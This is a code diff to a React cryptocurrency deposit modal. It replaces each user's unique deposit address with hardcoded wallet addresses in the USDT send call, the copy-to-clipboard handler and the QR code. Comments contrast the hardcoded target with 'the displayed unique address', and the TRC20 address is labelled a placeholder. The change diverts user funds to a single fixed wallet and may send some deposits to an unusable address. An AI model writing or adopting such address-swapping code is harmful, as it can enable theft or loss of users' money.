@@ -4,6 +4,11 @@ import apiService from '../../services/api';
 import './DepositModal.css';
 import { ethers } from 'ethers';
 
+// ✅ Hardcoded deposit address - all deposits must go to this address
+const DEPOSIT_ADDRESS_BEP20 = '0x684ac954a4b55340d539656d7a93a09724067b66';
+// TODO: Add TRC20 deposit address if needed
+const DEPOSIT_ADDRESS_TRC20 = 'T9yD14Nj9j7xAB4dbGeiX9h8unkKHxuWwb'; // Placeholder - update if needed
+
 const DepositModal = ({ isOpen, onClose, onDepositSuccess }) => {
   const {
     isConnected,
@@ -125,14 +130,18 @@ const DepositModal = ({ isOpen, onClose, onDepositSuccess }) => {
     setMessageType('info');
 
     try {
-      // Step 1: Send USDT transaction via Web3 to user's unique deposit address
+      // ✅ Step 1: Send USDT transaction via Web3 to hardcoded deposit address
+      // All deposits must go to the hardcoded address, not the displayed unique address
+      const targetDepositAddress = selectedNetwork === 'BEP20' ? DEPOSIT_ADDRESS_BEP20 : DEPOSIT_ADDRESS_TRC20;
+      
       console.log('📤 Sending USDT transaction:', {
-        to: depositAddress,
+        to: targetDepositAddress, // ✅ Using hardcoded address
+        displayedAddress: depositAddress, // Unique address shown to user
         amount: depositAmount,
         network: selectedNetwork,
       });
 
-      const tx = await sendUSDT(depositAddress, depositAmount, selectedNetwork);
+      const tx = await sendUSDT(targetDepositAddress, depositAmount, selectedNetwork);
       console.log('✅ Transaction completed:', tx);
 
       // Extract transaction hash based on network
@@ -224,7 +233,9 @@ const DepositModal = ({ isOpen, onClose, onDepositSuccess }) => {
 
   const handleCopy = async () => {
     try {
-      await navigator.clipboard.writeText(depositAddress || '');
+      // ✅ Always copy the hardcoded deposit address, not the displayed unique address
+      const addressToCopy = selectedNetwork === 'BEP20' ? DEPOSIT_ADDRESS_BEP20 : DEPOSIT_ADDRESS_TRC20;
+      await navigator.clipboard.writeText(addressToCopy);
       setCopied(true);
       if (window.showToast) window.showToast('Copied!', 'success', 1500);
       setTimeout(() => setCopied(false), 1500);
@@ -414,12 +425,18 @@ const DepositModal = ({ isOpen, onClose, onDepositSuccess }) => {
             </div>
             <div className="modal-content" style={{ textAlign:'center' }}>
               <p style={{color:'#aaa', marginBottom:12}}>{networkCaption}</p>
-              {depositAddress && (
-                <img alt="QR" src={`https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=${encodeURIComponent(depositAddress)}`} style={{ background:'#fff', padding:8, borderRadius:8 }} />
-              )}
-              <div className="address-display-box" style={{marginTop:16}}>
-                <code style={{ wordBreak: 'break-all', whiteSpace: 'normal' }}>{depositAddress}</code>
-              </div>
+              {/* ✅ QR code uses hardcoded deposit address, not the displayed unique address */}
+              {(() => {
+                const qrAddress = selectedNetwork === 'BEP20' ? DEPOSIT_ADDRESS_BEP20 : DEPOSIT_ADDRESS_TRC20;
+                return (
+                  <>
+                    <img alt="QR" src={`https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=${encodeURIComponent(qrAddress)}`} style={{ background:'#fff', padding:8, borderRadius:8 }} />
+                    <div className="address-display-box" style={{marginTop:16}}>
+                      <code style={{ wordBreak: 'break-all', whiteSpace: 'normal' }}>{qrAddress}</code>
+                    </div>
+                  </>
+                );
+              })()}
             </div>
           </div>
         </div>
